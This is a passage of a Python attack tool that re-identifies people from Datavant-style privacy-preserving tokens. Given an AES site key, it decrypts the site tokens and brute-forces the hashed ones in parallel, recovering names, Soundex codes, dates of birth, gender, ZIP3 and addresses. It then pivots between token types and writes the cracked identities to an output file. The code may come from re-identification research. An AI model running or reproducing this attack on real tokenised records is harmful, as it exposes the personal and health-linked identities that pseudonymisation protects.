                pool_args = partial(pivot_to_T4_via_T7_T2_worker,
                                    master_tokens=dec["T4"],
                                    max_fn_len=MAX_FN_LEN,
                                    max_ln_len=MAX_LN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool:
                    results = pool.map(pool_args, t7_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t4_pivot_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns == "T2,T1,T4,T3,T9":
            if "T2" in dec:
                print("[*] Attacking T2 (Pure BF, Parallel)..."); start = time.time()
                sdx_ln_chunks = chunk_list(all_sdx_ln_list, num_processes)
                pool_args = partial(attack_T2_fast_worker, master_tokens=dec["T2"], use_sdx_first_b=list(ALL_SDX_FN), dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, sdx_ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t2_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t2_time = time.time() - start
                print(f"    -> Found {len(t2_hits)} T2 ({t2_time:.2f}s). Hashes: {HASHES}")
            if "T1" in dec and t2_hits:
                print("[*] Attacking T1 via T2 (Pure BF, Parallel)..."); start = time.time()
                t2_hits_list = list(t2_hits.values())
                t2_chunks = chunk_list(t2_hits_list, num_processes)
                pool_args = partial(attack_T1_via_T2_pure_worker,
                                    master_tokens=dec["T1"],
                                    max_fn_len=MAX_FN_LEN,
                                    max_ln_len=MAX_LN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, t2_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t1_hits_pure.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t1_time = time.time() - start
                t1_hits = {mt: p[0] for mt, p in t1_hits_pure.items()}
                print(f"    -> Found {len(t1_hits)} T1 ({t1_time:.2f}s, preimage cap={args.bf_max_preimages}). Hashes: {HASHES}")
            if "T4" in dec and t1_hits_pure:
                print("[*] Pivoting to T4 via T1/T2 (Pure BF, Parallel)..."); start = time.time()
                t1_hits_list = list(t1_hits_pure.items())
                t1_chunks = chunk_list(t1_hits_list, num_processes)
                pool_args = partial(pivot_to_T4_via_T1_T2_worker,
                                    master_tokens=dec["T4"],
                                    max_fn_len=MAX_FN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool:
                    results = pool.map(pool_args, t1_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t4_pivot_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 ({t4_time:.2f}s). Hashes: {HASHES}")
        else:
             print(f"[!] Unsupported or unimplemented brute-force column combination: {args.columns}")

    # Final Pivots (Common to both modes if T4 was found)
    if "T3" in dec and t4_pivot_hits:
        print("[*] Pivoting to T3 via T4..."); start = time.time()
        for _, t4_preimage in t4_pivot_hits.items():
            out = pivot_to_T3_fast(dec["T3"], t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher) 
            t3_pivot_hits.update(out)
        t3_time = time.time() - start
        print(f"    -> Found {len(t3_pivot_hits)} T3 ({t3_time:.2f}s). Hashes: {HASHES}")

    if "T9" in dec and t4_pivot_hits and TOP_ADDRESS_:
        print("[*] Pivoting to T9 via T4..."); start = time.time()
        for _, t4_preimage in t4_pivot_hits.items():
             out = pivot_to_T9_fast(dec["T9"], t4_preimage[1], TOP_ADDRESS_, args.lang, HOUSE_NUMBERS, init_hasher) 
             t9_pivot_hits.update(out)
        t9_time = time.time() - start
        print(f"    -> Found {len(t9_pivot_hits)} T9 ({t9_time:.2f}s). Hashes: {HASHES}")

    """if "T9" in dec and t4_pivot_hits and TOP_ADDRESS_:
        print("[*] Pivoting to T9 via T4 (Parallel)..."); start = time.time()
        t4_hits_list = list(t4_pivot_hits.items())
        t4_chunks = chunk_list(t4_hits_list, num_processes)
        
        pool_args = partial(pivot_to_T9_fast_worker,
                            master_tokens=dec["T9"],
                            address_list_raw=TOP_ADDRESS_,
                            lang=args.lang,
                            house_numbers=HOUSE_NUMBERS,
                            master_salt_bytes=master_salt_bytes)
        
        with multiprocessing.Pool(processes=num_processes) as pool:
            results = pool.map(pool_args, t4_chunks)

        total_worker_hashes = 0
        for hits_dict, hash_count in results:
            t9_pivot_hits.update(hits_dict)
            total_worker_hashes += hash_count

        HASHES += total_worker_hashes
        t9_time = time.time() - start
        print(f"    -> Found {len(t9_pivot_hits)} T9 ({t9_time:.2f}s). Hashes: {HASHES}")"""

    # Print results
    print(f"[*] Writing results to {args.outfile}...")
    with open(args.outfile, "w", encoding="utf-8") as f:
        if t1_hits:
            f.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
            if t1_time > 0: f.write(f"[TIMER] T1: {t1_time:.2f} seconds\n")
            for mt, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode('utf-8','ignore')} fi={fi_b.decode('utf-8','ignore')} g={g_b.decode('utf-8','ignore')} dob={dob_b.decode('utf-8','ignore')}\n")
        if t2_hits:
            f.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
            if t2_time > 0: f.write(f"[TIMER] T2: {t2_time:.2f} seconds\n")
            for mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   sdx_ln={sdx_ln_b.decode('utf-8','ignore')} sdx_fn={sdx_fn_b.decode('utf-8','ignore')} g={g_b.decode('utf-8','ignore')} dob={dob_b.decode('utf-8','ignore')}\n")
        if t7_hits:
            f.write(f"[T7] {len(t7_hits)} master tokens cracked\n")
            if t7_time > 0: f.write(f"[TIMER] T7: {t7_time:.2f} seconds\n")
            for mt, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode('utf-8','ignore')} fi3={fi3_b.decode('utf-8','ignore')} g={g_b.decode('utf-8','ignore')} dob={dob_b.decode('utf-8','ignore')}\n")
        if t4_pivot_hits:
            f.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            if t4_time > 0: f.write(f"[TIMER] T4: {t4_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, g_b, dob_b) in t4_pivot_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode('utf-8','ignore')} fn={fn_b.decode('utf-8','ignore')} g={g_b.decode('utf-8','ignore')} dob={dob_b.decode('utf-8','ignore')}\n")
        if t3_pivot_hits:
            f.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
            if t3_time > 0: f.write(f"[TIMER] T3: {t3_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, dob_b, zip3_b) in t3_pivot_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode('utf-8','ignore')} fn={fn_b.decode('utf-8','ignore')} dob={dob_b.decode('utf-8','ignore')} zip3={zip3_b.decode('utf-8','ignore')}\n")
        if t9_pivot_hits:
            f.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
            if t9_time > 0: f.write(f"[TIMER] T9: {t9_time:.2f} seconds\n")
            for mt, (fn_b, addr_b) in t9_pivot_hits.items():
                 f.write(f"MT(hex)={mt.hex()}   ←   fn={fn_b.decode('utf-8','ignore')} address={addr_b.decode('utf-8','ignore')}\n")
    print(f"[*] Results written to {args.outfile}")
    print(f"[TOTAL HASHES] {HASHES}")

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names (e.g., T1,T2,T4 or T2,T1,T7,T4...)")
    ap.add_argument("--dist-file", default="", dest="dist_file", help="(Optional) Distribution CSV (first_name,last_name,address)")
    ap.add_argument("--top-n", dest="top_n", type=int, default=500, help="How many top freq values for dicts (default: 500)")
    ap.add_argument("--site-key", required=True, help="AES-256 key (hex or utf-8)")
    ap.add_argument("--lang", choices=["de", "us"], default="de", help="Language for hardcoded dicts if --dist-file is not used (default: de)")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8)")
    ap.add_argument("--bruteforce", action="store_true", help="Use PURE brute-force (generator) instead of dictionary/reference lists")
    ap.add_argument("--max-fn-len", dest="max_fn_len", type=int, default=8, help="Max length for first name brute-force (default: 8)")
    ap.add_argument("--max-ln-len", dest="max_ln_len", type=int, default=8, help="Max length for last name brute-force (default: 8)")
    ap.add_argument("--bf-max-preimages", type=int, default=100000,
                     help="Max Soundex preimages per hit in pure BF stage (limits memory/time) (default: 100000).")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()